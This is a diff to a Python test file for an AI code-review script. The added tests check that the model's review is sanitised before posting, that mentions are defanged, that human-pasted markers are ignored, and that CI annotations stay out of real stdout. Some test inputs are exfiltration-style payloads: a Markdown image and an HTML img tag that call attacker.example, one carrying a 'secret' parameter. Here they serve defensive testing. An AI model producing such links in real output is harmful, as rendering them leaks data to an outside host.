@@ -1,7 +1,9 @@
 """Tests of the AI review script. No network and no API key: the model and GitHub are replaced by fakes."""
 
+import contextlib
 import http.server
 import importlib.util
+import io
 import json
 import os
 import tempfile
@@ -111,6 +113,49 @@ class PolicyTests(unittest.TestCase):
         self.assertFalse(ar.summarize_response(response(), 1)["fell_back"])
 
 
+class SanitizeTests(unittest.TestCase):
+    """The reader is the one who acts on the review, so the text is reduced to plain Markdown."""
+
+    def test_mentions_are_defanged_so_they_do_not_notify(self):
+        out = ar.sanitize_review("Ask @octocat and @org/team-a about it.")
+        self.assertIn("`@octocat`", out)
+        self.assertIn("`@org/team-a`", out)
+        self.assertNotIn(" @octocat", out)
+
+    def test_images_are_removed(self):
+        out = ar.sanitize_review("see ![x](https://attacker.example/p.png?d=secret) here")
+        self.assertNotIn("attacker.example", out)
+        self.assertIn("[image removed]", out)
+
+    def test_links_become_visible_text_not_clickable(self):
+        out = ar.sanitize_review("read [the docs](https://example.test/page) first")
+        self.assertNotIn("](", out)
+        self.assertIn("the docs (`https://example.test/page`)", out)
+
+    def test_html_that_renders_is_neutralised(self):
+        out = ar.sanitize_review('<img src="https://attacker.example/x"> and <a href="https://e.test">go</a>')
+        self.assertNotIn("<img", out)
+        self.assertNotIn("<a ", out)
+
+    def test_ordinary_technical_text_is_left_alone(self):
+        text = "Use `List<str>` and write to a@example.test or `@already_quoted`. Run terraform plan -out=x."
+        self.assertEqual(ar.sanitize_review(text), text)
+
+    def test_a_clean_review_is_not_marked_as_modified(self):
+        r = ar.summarize_response(response("### Summary\n- nothing unusual"), 1)
+        meta = {"repo": "o/r", "number": 7, "model": "m", "head_sha": "a" * 40}
+        self.assertFalse(ar.build_trace(r, meta, None, NOW)["output_modified"])
+
+    def test_a_modified_review_is_marked_in_the_trace_and_the_hash_is_of_the_original(self):
+        original = "ping @octocat"
+        r = ar.summarize_response(response(original), 1)
+        meta = {"repo": "o/r", "number": 7, "model": "m", "head_sha": "a" * 40}
+        trace = ar.build_trace(r, meta, None, NOW)
+        self.assertTrue(trace["output_modified"])
+        self.assertEqual(trace["output_sha256"], ar.sha256_hex(original))  # what the model returned
+        self.assertNotIn("ping @octocat", ar.render_comment(r, dict(meta, head_sha="a" * 40)))
+
+
 class RenderTests(unittest.TestCase):
     META = {"head_sha": "abcdef1234567890", "model": "claude-opus-5-5"}
 
@@ -184,7 +229,12 @@ class MainTests(unittest.TestCase):
             trace_path = os.path.join(d, "ai-trace.json")
             full = dict(ENV, **(env or {}), GITHUB_STEP_SUMMARY=os.path.join(d, "summary.md"))
             full = {k: v for k, v in full.items() if v is not None}
-            code = ar.main(full, http=gh, client_factory=lambda: client, now=NOW, trace_path=trace_path)
+            # main() prints workflow commands (::warning:: and ::error::). In CI the runner would turn them into
+            # real annotations of the run, so a test must never let them reach the real stdout.
+            captured = io.StringIO()
+            with contextlib.redirect_stdout(captured):
+                code = ar.main(full, http=gh, client_factory=lambda: client, now=NOW, trace_path=trace_path)
+            self.stdout = captured.getvalue()
             trace = summary = None
             if os.path.exists(trace_path):
                 with open(trace_path, encoding="utf-8") as fh:
@@ -208,10 +258,24 @@ class MainTests(unittest.TestCase):
         self.assertEqual(len(client.calls), 1)
 
     def test_a_second_run_edits_the_same_comment(self):
-        existing = [{"id": 99, "body": ar.MARKER + " old"}]
+        existing = [{"id": 99, "body": ar.MARKER + " old", "user": {"type": "Bot"}}]
         _, _, gh, _, _ = self.run_main(gh=FakeGitHub(comments=existing))
         self.assertEqual([w[0] for w in gh.writes], ["PATCH"])
         self.assertTrue(gh.writes[0][1].endswith("/issues/comments/99"))
+
+    def test_a_person_pasting_the_marker_is_not_edited_and_does_not_block_the_review(self):
+        pasted = [{"id": 50, "body": ar.MARKER + " pasted by a person", "user": {"type": "User"}}]
+        _, _, gh, _, _ = self.run_main(gh=FakeGitHub(comments=pasted))
+        self.assertEqual([w[0] for w in gh.writes], ["POST"])  # a new comment, not a PATCH of theirs
+
+    def test_running_main_in_a_test_never_reaches_the_real_stdout(self):
+        # In CI the runner turns "::warning::" and "::error::" lines on stdout into annotations of the run. A
+        # test of the failure paths printed some, and the run showed a failure that was only a test.
+        reached_real_stdout = io.StringIO()
+        with contextlib.redirect_stdout(reached_real_stdout):
+            self.run_main(env={"ANTHROPIC_API_KEY": None})
+        self.assertEqual(reached_real_stdout.getvalue(), "")
+        self.assertIn("::warning::", self.stdout)  # it was printed, but only into the test's own buffer
 
     def test_unrelated_comments_are_left_alone(self):
         _, _, gh, _, _ = self.run_main(gh=FakeGitHub(comments=[{"id": 5, "body": "a human wrote this"}]))
